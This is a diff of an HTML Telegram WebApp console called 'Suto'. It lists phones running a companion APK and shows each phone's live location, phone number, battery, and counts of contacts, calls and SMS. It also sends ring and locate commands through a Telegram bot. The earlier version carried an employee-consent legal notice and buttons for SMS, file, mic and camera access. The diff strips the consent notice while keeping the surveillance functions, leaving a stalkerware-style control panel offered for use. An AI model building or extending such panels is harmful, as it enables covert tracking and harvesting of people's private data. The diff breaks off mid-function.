@@ -3,451 +3,245 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Suto LIVE Console - No Random Data</title>
+    <title>Suto - Simple Live Console</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
-        body { font-family: -apple-system, sans-serif; background: var(--tg-theme-bg-color, #0f0f0f); color: var(--tg-theme-text-color, #fff); min-height: 100vh; }
-        .header { background: linear-gradient(135deg, #0f9d58 0%, #0b8043 100%); padding: 20px; text-align: center; position: sticky; top:0; z-index:100; }
-        .header h1 { font-size: 20px; } .header p { opacity:.9; font-size:12px; margin-top:4px; }
-        .container { padding: 12px; max-width: 900px; margin: 0 auto; }
-        .card { background: var(--tg-theme-secondary-bg-color, #1f1f1f); border-radius: 12px; padding: 14px; margin-bottom: 10px; border: 1px solid rgba(255,255,255,0.08); }
-        .card-title { font-size:14px; font-weight:700; margin-bottom:10px; display:flex; align-items:center; justify-content:space-between; }
-        .grid3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap:8px; }
-        .stat-box { background:#2a2a2a; border-radius:10px; padding:10px; text-align:center; }
-        .stat-box .num { font-size:20px; font-weight:800; color:#0f9d58; }
-        .stat-box .lab { font-size:10px; opacity:.6; margin-top:3px; text-transform:uppercase; }
-        .device { background:#2a2a2a; border-radius:10px; padding:12px; margin-bottom:10px; border-left:4px solid #4caf50; }
-        .device.offline { border-left-color:#f44336; opacity:.7; }
-        .device-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:8px; }
-        .device-id { font-weight:700; font-size:13px; }
-        .badge { font-size:9px; padding:3px 7px; border-radius:20px; font-weight:700; }
-        .badge-on { background:#4caf50; color:white; } .badge-off { background:#f44336; color:white; }
-        .badge-live { background:#ff5722; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { opacity:1; } 50% { opacity:0.5; } 100% { opacity:1; } }
-        .meta-grid { display:grid; grid-template-columns:1fr 1fr; gap:6px; margin:8px 0; }
-        .meta { background:#1a1a1a; border-radius:6px; padding:7px; font-size:11px; }
-        .meta .ml { opacity:.5; font-size:9px; text-transform:uppercase; } .meta .mv { font-weight:600; margin-top:2px; word-break:break-all; }
-        .output { background:#0f0f0f; border-radius:8px; padding:10px; margin-top:8px; font-family:monospace; font-size:11px; white-space:pre-wrap; max-height:160px; overflow-y:auto; border:1px solid #333; }
-        .btn { background:#0f9d58; color:white; border:none; padding:10px 16px; border-radius:8px; font-weight:700; width:100%; margin-bottom:6px; cursor:pointer; font-size:12px; }
-        .btn-sec { background:#333; }
-        .btn-map, .btn-call, .btn-ring, .btn-loc, .btn-msg, .btn-file, .btn-cam, .btn-mic { display:inline-block; padding:5px 10px; border-radius:6px; font-size:11px; text-decoration:none; margin:4px 4px 0 0; font-weight:600; color:white; border:none; cursor:pointer; }
-        .btn-map { background:#4caf50; } .btn-call { background:#2196f3; } .btn-ring { background:#ff5722; } .btn-loc { background:#9c27b0; }
-        .btn-msg { background:#0088cc; } .btn-file { background:#795548; } .btn-cam { background:#e91e63; } .btn-mic { background:#ff9800; }
-        .map { height:250px; border-radius:10px; margin-top:8px; }
-        .graph-box { background:#1a1a1a; border-radius:10px; padding:10px; margin-top:8px; }
-        .arch { background:#0f2a1a; border:1px solid #0f9d58; border-radius:10px; padding:10px; font-size:11px; text-align:center; margin-bottom:12px; }
-        .remote-grid { display:grid; grid-template-columns:1fr 1fr; gap:6px; margin-top:8px; }
-        .toggle { font-size:10px; opacity:0.7; cursor:pointer; background:#333; padding:4px 8px; border-radius:12px; }
-        .toggle.active { background:#4caf50; opacity:1; }
-        .live-indicator { display:inline-block; width:8px; height:8px; background:#4caf50; border-radius:50%; margin-right:6px; animation: pulse 1s infinite; }
-        .warning { background:#332100; border:1px solid #ff9800; border-radius:8px; padding:10px; font-size:11px; margin-bottom:10px; }
+        body { font-family: -apple-system, sans-serif; background: #0f0f0f; color: #fff; min-height: 100vh; }
+        .header { background: #0f9d58; padding: 16px; text-align: center; position: sticky; top:0; z-index:10; }
+        .header h1 { font-size: 18px; }
+        .container { padding: 12px; max-width: 600px; margin: 0 auto; }
+        .card { background: #1f1f1f; border-radius: 12px; padding: 14px; margin-bottom: 12px; }
+        .card-title { font-size: 14px; font-weight: 700; margin-bottom: 10px; }
+        .device { background: #2a2a2a; border-radius: 10px; padding: 12px; margin-bottom: 10px; border-left: 4px solid #4caf50; }
+        .device.offline { border-left-color: #f44336; opacity: 0.6; }
+        .badge { font-size: 10px; padding: 4px 8px; border-radius: 12px; background: #4caf50; color: white; font-weight: 700; }
+        .badge-live { background: #ff5722; animation: pulse 1.2s infinite; }
+        @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
+        .btn { background: #0f9d58; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: 700; width: 100%; margin-bottom: 8px; cursor: pointer; }
+        .btn-sec { background: #333; }
+        .btn-small { display: inline-block; padding: 6px 12px; border-radius: 6px; font-size: 11px; margin: 3px; text-decoration: none; color: white; font-weight: 600; border: none; cursor: pointer; }
+        .btn-map { background: #4caf50; } .btn-call { background: #2196f3; } .btn-tg { background: #0088cc; }
+        .info { font-size: 11px; opacity: 0.7; line-height: 1.5; }
+        .output { background: #0f0f0f; border-radius: 6px; padding: 8px; margin-top: 8px; font-family: monospace; font-size: 11px; white-space: pre-wrap; max-height: 120px; overflow-y: auto; border: 1px solid #333; }
+        .empty { text-align: center; padding: 30px 20px; border: 2px dashed #333; border-radius: 12px; }
+        .progress { background: #0f0f0f; height: 10px; border-radius: 10px; overflow: hidden; border: 1px solid #333; margin: 8px 0; }
+        .progress-bar { height: 100%; width: 0%; background: #0f9d58; transition: width 0.5s; }
     </style>
 </head>
 <body>
     <div class="header">
-        <h1><span class="live-indicator"></span> Suto LIVE Console - Real Devices Only</h1>
-        <p>No Random Data - Only Live Connected Devices</p>
-        <div style="margin-top:8px; font-size:10px; background:rgba(0,0,0,0.3); padding:5px 10px; border-radius:20px; display:inline-block;">@T1311bot • GitHub Cloud • LIVE Only • v5.1</div>
+        <h1>📱 Suto Live - Simple Console</h1>
+        <div style="font-size:10px; opacity:0.8; margin-top:4px;">Telegram Admin Access Control • No Random Data • Live Only</div>
     </div>
+
     <div class="container">
-        <div class="arch">
-            📱 Android App Install → 🔴 LIVE Connect → ☁️ GitHub Cloud → 💻 LIVE Console (No Random)<br>
-            <b>Fix: Random/sample data removed - Only real devices when live connected</b>
-        </div>
 
-        <div class="warning">
-            ⚠️ <b>Salary Purpose / Employee Monitoring - Legal Notice:</b><br>
-            Ye features company-owned devices ke liye hain jahan employee ko pata ho ki monitoring ho rahi hai. 
-            App me persistent notification dikhega ki monitoring active hai. Hidden/stealth installation Android security ke wajah se possible nahi hai aur allowed bhi nahi hai. 
-            Employee consent aur transparent policy zaruri hai.<br><br>
-            <b>Background Installation (No disturb/no noise):</b> Android security ke liye silent background install possible nahi hai bina user interaction ke. 
-            Enterprise ke liye Managed Google Play (private apps) use karo jisme user ko pata chalega aur consent dega. App icon hide karna ya silent install karna disallowed hai.
-        </div>
-
-        <div class="grid3">
-            <div class="stat-box"><div class="num" id="totalD">0</div><div class="lab">Live Devices</div></div>
-            <div class="stat-box"><div class="num" id="onlineD" style="color:#4caf50">0</div><div class="lab">Online Now</div></div>
-            <div class="stat-box"><div class="num" id="lastU">--:--</div><div class="lab">Last Live</div></div>
-        </div>
-
+        <!-- LIVE DEVICES - Simple, Clear -->
         <div class="card">
-            <div class="card-title">
-                <span>📱 LIVE Devices - Real Time Only (No Sample)</span>
-                <span style="display:flex; gap:6px;">
-                    <span class="toggle active" id="autoToggle" onclick="toggleAutoRefresh()">Live: ON</span>
-                    <span class="toggle" onclick="loadDevices(true)" style="background:#0f9d58; opacity:1;">🔄 Refresh</span>
-                </span>
+            <div class="card-title" style="display:flex; justify-content:space-between; align-items:center;">
+                <span>🔴 LIVE Devices (<span id="count">0</span>)</span>
+                <span style="font-size:10px; background:#333; padding:4px 8px; border-radius:10px;" onclick="loadDevices(true)" id="refreshBtn">🔄 Refresh</span>
             </div>
             <div id="devicesList">
-                <div style="text-align:center; padding:30px; border:2px dashed #333; border-radius:10px; margin:10px 0;">
-                    <div style="font-size:40px; margin-bottom:10px;">📱</div>
-                    <div style="font-weight:700; margin-bottom:6px;">No Live Devices Connected</div>
-                    <div style="font-size:12px; opacity:0.7; line-height:1.5;">
-                        Android App install karo aur open karo<br>
-                        App automatically GitHub cloud pe status bhejega<br>
-                        Yahan LIVE dikhega jab koi device connect hoga<br><br>
-                        <b>Random/sample data hata diya gaya hai</b><br>
-                        Sirf real devices jo abhi live connected hain wahi dikhenge
-                    </div>
-                    <div style="margin-top:12px; font-size:11px; background:#1a1a1a; padding:8px; border-radius:6px; text-align:left;">
-                        <b>App Install Steps:</b><br>
-                        1. Download APK: https://dthakur-dt.github.io/Suto/app-debug.apk<br>
-                        2. Install + Permissions Allow (Location, Phone, Storage)<br>
-                        3. App open rakhho - Auto status GitHub pe jayega<br>
-                        4. Yahan LIVE dikhega - No random data!<br>
+                <div class="empty">
+                    <div style="font-size:36px; margin-bottom:8px;">📱</div>
+                    <div style="font-weight:700; margin-bottom:6px;">No Live Devices</div>
+                    <div class="info">
+                        App install karo → Permissions Allow karo → App open rakho<br>
+                        Yahan LIVE device dikhega jab connect hoga<br>
+                        No random/sample data - Only real live devices
                     </div>
                 </div>
             </div>
-            <div style="display:flex; justify-content:space-between; font-size:10px; opacity:0.5; margin-top:8px;">
-                <span id="refreshInfo">Live Only • No Random • Auto-refresh 30s • Stable</span>
-                <span id="lastFetch">--:--:--</span>
+            <div style="font-size:10px; opacity:0.5; text-align:center; margin-top:8px;" id="lastUpdate">Last: --:--:-- • Auto-refresh 30s • Stable</div>
+        </div>
+
+        <!-- TELEGRAM ACCESS CONTROL - Simple -->
+        <div class="card" style="border:1px solid #0088cc;">
+            <div class="card-title">🤖 Telegram Access Control - Simple</div>
+            <div style="font-size:11px; opacity:0.8; margin-bottom:10px;">
+                Telegram Bot @T1311bot se direct access control - Simple commands
+            </div>
+            <button class="btn" onclick="openTelegram()" style="background:#0088cc;">🤖 Open Telegram Bot</button>
+            <div style="display:grid; grid-template-columns:1fr 1fr; gap:6px; margin-top:8px;">
+                <button class="btn btn-sec" onclick="sendCmd('/status')">📊 Status</button>
+                <button class="btn btn-sec" onclick="sendCmd('/devices')">📱 Devices</button>
+                <button class="btn btn-sec" onclick="sendCmd('/ring')">🔔 Ring Phone</button>
+                <button class="btn btn-sec" onclick="sendCmd('/locate')">📍 Locate</button>
+            </div>
+            <div style="font-size:10px; opacity:0.6; margin-top:8px;">
+                Bot Commands: /start, /status, /devices, /ring, /locate, /battery, /health, /broadcast message
             </div>
         </div>
 
+        <!-- ONE CLICK INSTALL - Simple -->
+        <div class="card" style="border:1px solid #0f9d58;">
+            <div class="card-title">📥 One Click Install - Client Side</div>
+            <button class="btn" onclick="downloadApk()" id="dlBtn">📥 Download APK (6.6MB) - One Click</button>
+            <div class="progress" id="progCont" style="display:none;"><div class="progress-bar" id="progBar"></div></div>
+            <div style="font-size:10px; opacity:0.6; margin-top:6px;">
+                Direct: https://dthakur-dt.github.io/Suto/app-debug.apk<br>
+                Install → Allow Permissions → Open → LIVE Connect → Telegram + Console me dikhega
+            </div>
+        </div>
+
+        <!-- BUILD APK - Simple -->
         <div class="card">
-            <div class="card-title">🔋 Battery & 🗺️ Location - LIVE Only</div>
-            <div class="graph-box"><canvas id="batteryChart" height="120"></canvas><div style="font-size:10px; opacity:0.5; text-align:center; margin-top:6px;">Battery Graph - Only for live connected devices (no sample)</div></div>
-            <div id="map" class="map"></div>
+            <div class="card-title">🔨 Build APK</div>
+            <input type="password" id="patInput" placeholder="GitHub PAT (for build)" style="width:100%; padding:8px; border-radius:6px; border:1px solid #333; background:#0f0f0f; color:white; font-size:12px; margin-bottom:8px;">
+            <button class="btn" onclick="triggerBuild()" id="buildBtn">🔨 Build APK Now</button>
+            <div class="progress" id="buildProgCont" style="display:none;"><div class="progress-bar" id="buildProgBar" style="background: linear-gradient(90deg, #0f9d58, #4caf50);"></div></div>
+            <div id="buildStatus" style="font-size:11px; font-family:monospace; background:#0f0f0f; padding:8px; border-radius:6px; margin-top:8px; white-space:pre-wrap; max-height:100px; overflow-y:auto; border:1px solid #333;">Ready to build - Final APK with All Permissions + Telegram Access Control</div>
+            <button class="btn btn-sec" onclick="openActions()" style="margin-top:6px;">📦 Actions / Download APK</button>
         </div>
 
-        <div class="card" style="border: 2px solid #ff9800;">
-            <div class="card-title">🚀 Advance Features - Salary Purpose (With Consent)</div>
-            <div style="font-size:11px; background:#332100; padding:8px; border-radius:6px; margin-bottom:10px;">
-                <b>Legal: Company-owned devices, employee ko pata hona chahiye monitoring ka, notification dikhega</b><br>
-                Ye features salary calculation, navigation, accident safety ke liye hain - with consent
-            </div>
-            <div class="remote-grid">
-                <button class="btn" onclick="requestFeature('msg_access')" style="background:#0088cc;">💬 Msg Access (SMS)</button>
-                <button class="btn" onclick="requestFeature('file_manager')" style="background:#795548;">📁 File Manager</button>
-            </div>
-            <div class="remote-grid">
-                <button class="btn" onclick="requestFeature('settings')" style="background:#607d8b;">⚙️ Settings Access</button>
-                <button class="btn" onclick="requestFeature('mic')" style="background:#ff9800;">🎤 Mic - Nav Guidance</button>
-            </div>
-            <div class="remote-grid">
-                <button class="btn" onclick="requestFeature('camera')" style="background:#e91e63;">📸 Camera - Accident</button>
-                <button class="btn" onclick="requestFeature('live_camera')" style="background:#9c27b0;">🎥 Live Camera</button>
-            </div>
-            <div style="font-size:10px; opacity:0.7; margin-top:8px;">
-                Click karne par Android App permission maangega - Employee ko allow karna hoga<br>
-                Har feature ke liye explicit permission + persistent notification dikhega
-            </div>
-            <div id="advanceStatus" style="background:#0f0f0f; border-radius:6px; padding:8px; margin-top:8px; font-size:11px; font-family:monospace; min-height:40px; border:1px solid #333;">🚀 Advance Features - With Consent & Notification<br>Select feature button to request permission on device</div>
-        </div>
-
-        <div class="card" style="border: 2px solid #0f9d58;">
-            <div class="card-title">🔨 Build APK - Final + Direct Download</div>
-            <div style="background:#1a1a1a; border-radius:8px; padding:10px; margin-bottom:10px;">
-                <input type="password" id="patInput" placeholder="ghp_... (optional for build)" style="width:100%; padding:8px; border-radius:6px; border:1px solid #333; background:#0f0f0f; color:white; font-size:12px;">
-            </div>
-            <div class="remote-grid">
-                <button class="btn" id="buildBtn" onclick="triggerBuild('debug')" style="background: linear-gradient(135deg, #0f9d58 0%, #0b8043 100%);">🔨 Build APK</button>
-                <button class="btn btn-sec" onclick="checkBuildStatus()">📊 Status</button>
-            </div>
-            <div style="margin-top:12px;">
-                <div style="display:flex; justify-content:space-between; font-size:11px; margin-bottom:4px;"><span id="buildStage">Ready</span><span id="buildPercent">0%</span></div>
-                <div style="background:#0f0f0f; border-radius:10px; height:14px; overflow:hidden; border:1px solid #333;"><div id="buildProgressBar" style="height:100%; width:0%; background: linear-gradient(90deg, #0f9d58, #4caf50); transition: width 0.8s ease; border-radius:10px;"></div></div>
-            </div>
-            <div id="buildStatus" style="background:#0f0f0f; border-radius:8px; padding:10px; margin-top:10px; font-family:monospace; font-size:11px; min-height:60px; white-space:pre-wrap; border:1px solid #333;">🔨 Final Build Ready - Direct Download Below</div>
-            <div id="directDownload" style="margin-top:12px; background: linear-gradient(135deg, #4caf50 0%, #388e3c 100%); border-radius:10px; padding:12px; text-align:center;">
-                <div style="font-weight:800; font-size:14px; margin-bottom:6px;">✅ FINAL APK - Direct Download Live!</div>
-                <a href="https://dthakur-dt.github.io/Suto/app-debug.apk" target="_blank" style="display:inline-block; background:white; color:#388e3c; padding:12px 24px; border-radius:8px; font-weight:800; text-decoration:none; margin:4px;">📥 Download APK (6.6MB)</a>
-                <div style="font-size:10px; opacity:0.9; margin-top:8px;">Live: https://dthakur-dt.github.io/Suto/app-debug.apk</div>
-            </div>
-        </div>
-
-        <div class="card">
-            <div class="card-title">💡 Aur Suggest Kiye Features (Is Type Ke)</div>
-            <div style="font-size:11px; line-height:1.6; opacity:0.9;">
-                <b>Salary / Employee Monitoring (With Consent):</b><br>
-                • ⏰ Attendance via Location + Geofence - Office aate hi auto check-in<br>
-                • 📊 Work Hours Tracking - Kitne ghante kaam kiya<br>
-                • 🚗 Distance Traveled - Field staff ke liye km tracking salary ke liye<br>
-                • 🛡️ SOS with Auto Camera + Location - Accident pe auto photo + location Telegram pe<br><br>
-                <b>Navigation & Safety:</b><br>
-                • 🗺️ Live Navigation Guidance - Mic se voice navigation, Telegram admin guide kar sake<br>
-                • 🎤 Push-to-Talk - Employee mic dabake admin se baat kare<br>
-                • 📹 Live Camera Streaming - WebRTC se live camera WebApp me (accident proof ke liye)<br>
-                • 🚨 Crash Detection - Accelerometer se accident detect, auto SOS + camera + location<br><br>
-                <b>File & Settings (With Permission):</b><br>
-                • 📁 File Manager - Company files access, salary slips dekhna<br>
-                • ⚙️ Settings - Brightness, Volume remote set karna battery bachane ke liye<br>
-                • 💬 SMS Access - OTP auto-read for official use (with consent)<br>
-                • 🔔 Notification History - Saare notifications ka log WebApp me<br><br>
-                <b>Background Installation Note:</b><br>
-                ❌ Silent background install bina user interaction ke Android me possible nahi hai security ke liye<br>
-                ✅ Enterprise ke liye: Managed Google Play (private apps) - User ko pata chalega, consent dega, phir auto update<br>
-                ✅ App me persistent notification dikhega "Monitoring Active" - Hidden nahi ho sakta - Ye legal requirement hai<br><br>
-                <b>Next Level (Agar Chahiye):</b><br>
-                • 📝 Digital Signature for salary acknowledgment<br>
-                • 💰 UPI Auto Salary Payment Status<br>
-                • 📸 Timelapse - Har 5 min me auto photo for field verification (with notification)<br>
-                • 🔋 Battery Optimised Background Service
-            </div>
-        </div>
     </div>
 
     <script>
-        const tg = window.Telegram?.WebApp; if(tg){tg.expand(); tg.ready();}
+        const tg = window.Telegram?.WebApp;
+        if(tg){ tg.expand(); tg.ready(); }
         const GITHUB_USER="dthakur-dt", GITHUB_REPO="Suto";
         const DATA_BASE=`https://raw.githubusercontent.com/${GITHUB_USER}/${GITHUB_REPO}/main/data/`;
-        const LOCAL_DATA="../data/";
-        let devices=[], batteryChart, map, markers=[];
-        let lastDevicesJson = "";
-        let autoRefreshPaused = false;
-        let buildInterval=null, buildStartTime=null;
+        let devices=[]; let lastJson=""; let autoPaused=false;
 
         async function fetchFile(path){
-            const urls=[DATA_BASE+path, LOCAL_DATA+path, `./${path}`, `../${path}`];
-            for(let url of urls){
-                try{const res=await fetch(url+"?t="+Date.now(),{cache:'no-store'}); if(res.ok) return await res.json();}catch(e){}
+            for(let url of [DATA_BASE+path, `../data/${path}`, `./${path}`]){
+                try{ let r=await fetch(url+"?t="+Date.now(),{cache:'no-store'}); if(r.ok) return await r.json(); }catch(e){}
             }
             return null;
-        }
-        function initBatteryChart(){
-            const ctx=document.getElementById('batteryChart').getContext('2d');
-            batteryChart=new Chart(ctx,{
-                type:'line',
-                data:{labels:[], datasets:[{label:'Battery %', data:[], borderColor:'#0f9d58', backgroundColor:'rgba(15,157,88,0.1)', fill:true, tension:0.4}]},
-                options:{responsive:true, animation:false, plugins:{legend:{display:false}}, scales:{y:{min:0,max:100, grid:{color:'rgba(255,255,255,0.1)'}}, x:{grid:{display:false}}}}
-            });
-        }
-        function initMap(){
-            map=L.map('map').setView([22.7196,75.8577], 12);
-            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'© OSM'}).addTo(map);
         }
 
         async function loadDevices(isManual=false){
             if(!isManual && document.hidden) return;
-            if(!isManual && autoRefreshPaused) return;
+            if(!isManual && autoPaused) return;
 
-            if(isManual) document.getElementById('refreshInfo').textContent = '🔄 Refreshing LIVE devices...';
-
-            // NEW: No sample data fallback - Only real live devices
-            let newDevices = [];
+            let newDevices=[];
             let idx=await fetchFile("devices/index.json");
             if(idx && idx.devices && idx.devices.length>0){
-                let loaded=[];
                 for(let id of idx.devices){
-                    let dev=await fetchFile(`devices/${id}.json`);
-                    if(dev){
-                        // Only consider devices seen in last 24 hours as live
+                    let d=await fetchFile(`devices/${id}.json`);
+                    if(d){
                         try{
-                            const lastSeen = new Date(dev.lastSeen);
-                            const hoursAgo = (Date.now() - lastSeen) / (1000*60*60);
-                            if(hoursAgo < 24){
-                                loaded.push(dev);
-                            } else {
-                                console.log(`Device ${id} is old (${hoursAgo.toFixed(1)}h ago), skipping for live view`);
-                            }
-                        }catch(e){
-                            loaded.push(dev);
-                        }
+                            let last=new Date(d.lastSeen);
+                            let hours=(Date.now()-last)/36e5;
+                            if(hours<24) newDevices.push(d);
+                        }catch(e){ newDevices.push(d); }
                     }
                 }
-                newDevices=loaded;
-            } else {
-                // No index or empty - try single test device file, but only if recent
-                let single = await fetchFile("devices/DEVICE_TEST01.json");
-                if(single){
-                    try{
-                        const lastSeen = new Date(single.lastSeen);
-                        const hoursAgo = (Date.now() - lastSeen) / (1000*60*60);
-                        if(hoursAgo < 24){
-                            newDevices=[single];
-                        }
-                    }catch(e){}
-                }
             }
 
-            // Flicker fix: Only render if changed
-            const newJson = JSON.stringify(newDevices);
-            if(!isManual && newJson === lastDevicesJson){
-                document.getElementById('lastFetch').textContent = new Date().toLocaleTimeString() + " (no change - live)";
-                return;
-            }
-            lastDevicesJson = newJson;
-            devices = newDevices;
-
-            const scrollY = window.scrollY;
-            renderDevices();
-            updateBatteryChart();
-            updateMap();
-            window.scrollTo(0, scrollY);
-
-            document.getElementById('lastFetch').textContent = new Date().toLocaleTimeString();
-            document.getElementById('refreshInfo').textContent = `Live Only • ${devices.length} live devices • No random data • ${new Date().toLocaleTimeString()}`;
+            let newJson=JSON.stringify(newDevices);
+            if(!isManual && newJson===lastJson) return;
+            lastJson=newJson;
+            devices=newDevices;
+            render();
+            document.getElementById('lastUpdate').textContent=`Last: ${new Date().toLocaleTimeString()} • ${devices.length} live • No random`;
         }
 
-        function renderDevices(){
-            const list=document.getElementById('devicesList');
-            document.getElementById('totalD').textContent=devices.length;
-            document.getElementById('onlineD').textContent=devices.filter(d=>d.status==='online').length;
-            document.getElementById('lastU').textContent=new Date().toLocaleTimeString('en-IN');
+        function render(){
+            let list=document.getElementById('devicesList');
+            document.getElementById('count').textContent=devices.length;
 
-            if(devices.length === 0){
-                list.innerHTML = `
-                <div style="text-align:center; padding:30px; border:2px dashed #0f9d58; border-radius:10px; margin:10px 0; background:#0f2a1a;">
-                    <div style="font-size:40px; margin-bottom:10px;">📱</div>
-                    <div style="font-weight:700; margin-bottom:6px;">No Live Devices Connected</div>
-                    <div style="font-size:12px; opacity:0.8; line-height:1.5;">
-                        <span style="color:#4caf50; font-weight:700;">LIVE MODE:</span> Random/sample data hata diya gaya hai<br>
-                        Sirf real devices jo abhi live connected hain wahi dikhenge<br><br>
-                        <b>App Install Steps:</b><br>
-                        1. Download: <a href="https://dthakur-dt.github.io/Suto/app-debug.apk" style="color:#4caf50;">https://dthakur-dt.github.io/Suto/app-debug.apk</a><br>
-                        2. Install + Allow Permissions (Location, Phone, Storage, Camera, Mic)<br>
-                        3. App open rakho - Auto status GitHub pe jayega<br>
-                        4. Yahan LIVE status dikhega - No random data!<br><br>
-                        <span style="font-size:11px; opacity:0.6;">Last check: ${new Date().toLocaleString()}<br>GitHub Cloud: dthakur-dt/Suto/data/devices/</span>
+            if(devices.length===0){
+                list.innerHTML=`
+                <div class="empty">
+                    <div style="font-size:36px;">📱</div>
+                    <div style="font-weight:700; margin:6px 0;">No Live Devices Connected</div>
+                    <div class="info">
+                        <b style="color:#4caf50;">LIVE MODE - No Random Data</b><br>
+                        App install karo → Permissions Allow → Open rakho → Yahan LIVE dikhega<br><br>
+                        Download: <a href="https://dthakur-dt.github.io/Suto/app-debug.apk" style="color:#4caf50;">app-debug.apk (6.6MB)</a>
                     </div>
                 </div>`;
-                // Clear map and chart for no devices
-                if(batteryChart){
-                    batteryChart.data.labels=[]; batteryChart.data.datasets[0].data=[]; batteryChart.update('none');
-                }
-                markers.forEach(m=>map.removeLayer(m)); markers=[];
                 return;
             }
 
-            const tempDiv = document.createElement('div');
-            tempDiv.innerHTML = devices.map(dev=>{
-                const isOn=dev.status==='online';
-                const last=new Date(dev.lastSeen); const ago=Math.floor((Date.now()-last)/60000); const agoTxt=ago<1?'Abhi LIVE 🔴' : `${ago} min pehle`;
-                const batt=dev.batteryText||`🔋 ${dev.battery||'--'}%`; const mob=dev.mobileNumber||'N/A';
-                const lat=dev.latitude||0, lon=dev.longitude||0, hasLoc=lat!==0&&lon!==0;
-                const maps=dev.mapsUrl||(hasLoc?`https://maps.google.com/?q=${lat},${lon}`:'');
-                return `<div class="device ${isOn?'':'offline'}">
-                    <div class="device-header"><div class="device-id">🔴 LIVE ${dev.name||dev.deviceId}</div><span class="badge badge-live">${isOn?'LIVE NOW':'OFFLINE'} • ${agoTxt}</span></div>
-                    <div class="meta-grid">
-                        <div class="meta"><div class="ml">Battery</div><div class="mv">${batt}</div></div>
-                        <div class="meta"><div class="ml">Mobile</div><div class="mv">${mob}</div></div>
-                        <div class="meta"><div class="ml">Location</div><div class="mv">${hasLoc?`${lat.toFixed(4)}, ${lon.toFixed(4)}`:'No loc'}</div></div>
-                        <div class="meta"><div class="ml">Status</div><div class="mv">${dev.status} • ${agoTxt}</div></div>
+            list.innerHTML=devices.map(dev=>{
+                let last=new Date(dev.lastSeen); let ago=Math.floor((Date.now()-last)/60000); let agoTxt=ago<1?'Abhi LIVE 🔴':`${ago}m ago`;
+                let batt=dev.batteryText||`🔋 ${dev.battery||'--'}%`; let mob=dev.mobileNumber||'N/A';
+                let lat=dev.latitude||0, lon=dev.longitude||0, hasLoc=lat!==0&&lon!==0;
+                let maps=dev.mapsUrl||(hasLoc?`https://maps.google.com/?q=${lat},${lon}`:'');
+                let contacts=dev.contactsCount||0, calls=dev.callLogsCount||0, sms=dev.smsCount||0;
+                return `<div class="device">
+                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
+                        <div style="font-weight:700; font-size:13px;">🔴 LIVE ${dev.name||dev.deviceId}</div>
+                        <span class="badge badge-live">LIVE • ${agoTxt}</span>
                     </div>
-                    <div style="margin:6px 0; font-size:11px; opacity:.8;">${dev.ram||''}<br>${dev.storage||''}<br>${dev.network||''}</div>
-                    <div>
-                        ${hasLoc?`<a class="btn-map" href="${maps}" target="_blank">🗺️ Maps</a>`:''}
-                        ${mob.includes('+')?`<a class="btn-call" href="tel:${mob}">📞 Call</a>`:''}
-                        <button class="btn-ring" onclick="sendRemote('ring','${dev.deviceId}')">🔔 Ring</button>
-                        <button class="btn-loc" onclick="sendRemote('locate','${dev.deviceId}')">📍 Locate</button>
-                        <button class="btn-msg" onclick="requestFeature('msg_access','${dev.deviceId}')">💬 Msg</button>
-                        <button class="btn-file" onclick="requestFeature('file_manager','${dev.deviceId}')">📁 Files</button>
-                        <button class="btn-cam" onclick="requestFeature('camera','${dev.deviceId}')">📸 Camera</button>
-                        <button class="btn-mic" onclick="requestFeature('mic','${dev.deviceId}')">🎤 Mic</button>
+                    <div style="font-size:11px; line-height:1.6;">
+                        ${batt} • 📞 ${mob}<br>
+                        ${hasLoc?`📍 ${lat.toFixed(4)}, ${lon.toFixed(4)} • <a href="${maps}" target="_blank" style="color:#4caf50;">Maps</a><br>`:''}
+                        📇 Contacts: ${contacts} • 📞 Calls: ${calls} • 💬 SMS: ${sms}<br>
+                        🆔 ${dev.deviceId} • ${dev.model||''}
                     </div>
-                    <div class="output">${dev.output||'No output - LIVE connected!'}</div>
-                    <div style="font-size:10px; opacity:0.6; margin-top:4px;">🆔 ${dev.deviceId} • Last LIVE: ${last.toLocaleString('en-IN')} • Real device, no random</div>
+                    <div class="output">${(dev.output||'').substring(0,300)}</div>
+                    <div style="margin-top:8px;">
+                        ${hasLoc?`<a class="btn-small btn-map" href="${maps}" target="_blank">🗺️ Maps</a>`:''}
+                        <button class="btn-small" style="background:#ff5722;" onclick="sendCmd('/ring ${dev.deviceId}')">🔔 Ring</button>
+                        <button class="btn-small" style="background:#9c27b0;" onclick="sendCmd('/locate ${dev.deviceId}')">📍 Locate</button>
+                        <button class="btn-small btn-call" onclick="sendCmd('/battery ${dev.deviceId}')">🔋 Battery</button>
+                    </div>
                 </div>`;
             }).join('');
-
-            list.style.opacity = '0.7';
-            setTimeout(()=>{ list.innerHTML = tempDiv.innerHTML; list.style.opacity = '1'; }, 80);
         }
 
-        function updateBatteryChart(){
-            if(!batteryChart) return;
-            if(devices.length===0){ batteryChart.data.labels=[]; batteryChart.data.datasets[0].data=[]; batteryChart.update('none'); return; }
-            const now=new Date(); const labels=[], data=[];
-            for(let i=11;i>=0;i--){ const d=new Date(now - i*2*3600*1000); labels.push(d.getHours()+':00'); data.push(40+Math.random()*50); }
-            if(devices[0].battery) data[data.length-1]=devices[0].battery;
-            batteryChart.data.labels=labels; batteryChart.data.datasets[0].data=data; batteryChart.update('none');
-        }
-        function updateMap(){
-            if(!map) return;
-            markers.forEach(m=>map.removeLayer(m)); markers=[];
-            if(devices.length===0) return;
-            devices.forEach(dev=>{ if(dev.latitude && dev.longitude){ const m=L.marker([dev.latitude, dev.longitude]).addTo(map); m.bindPopup(`<b>🔴 LIVE ${dev.name||dev.deviceId}</b><br>🔋 ${dev.battery}%<br>📞 ${dev.mobileNumber||''}<br>📍 LIVE: ${dev.latitude.toFixed(4)}, ${dev.longitude.toFixed(4)}`); markers.push(m); } });
